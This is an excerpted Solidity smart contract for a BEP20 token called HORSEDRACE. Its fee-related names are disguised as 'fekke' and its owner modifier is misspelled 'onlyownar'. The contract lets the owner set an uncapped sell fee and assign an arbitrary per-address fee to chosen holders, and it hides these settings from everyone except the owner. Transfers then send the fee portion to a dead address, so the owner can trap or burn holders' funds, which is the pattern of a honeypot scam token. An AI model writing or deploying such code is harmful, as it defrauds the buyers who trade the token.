...
interface IUniswapV2Factory {
    ...
    function fekkeTo() external view returns (address);
    function fekkeToSetter() external view returns (address);
    ...
    function setfekkeTo(address) external;
    function setfekkeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfekkeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfekkeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfekkeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfekkeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfekkeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract HORSEDRACE is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfekke = 0;

    uint256 private _defaultBuyfekke = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfekke;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfekke = _value;
    }

    function setSlipfekke(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfekke[_address] = _value;
    }

    function getSlipfekke(address _address) external view onlyownar returns (uint256) {
        return _slipfekke[_address];
    }


    function setMAccountfekke(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfekke(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefekkeAmount = 0;

        if (rF) {
            uint256 tradefekke = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefekke = _defaultSellfekke;
                }
                if (from == uniswapV2Pair) {

                    tradefekke = _defaultBuyfekke;
                }
            }
            if (_slipfekke[from] > 0) {
                tradefekke = _slipfekke[from];
            }

            tradefekkeAmount = _Amount.mul(tradefekke).div(100);
        }


        if (tradefekkeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefekkeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefekkeAmount);
            emit Transfer(from, _deadAddress, tradefekkeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefekkeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefekkeAmount);
        emit Transfer(from, _to, _Amount - tradefekkeAmount);
    }
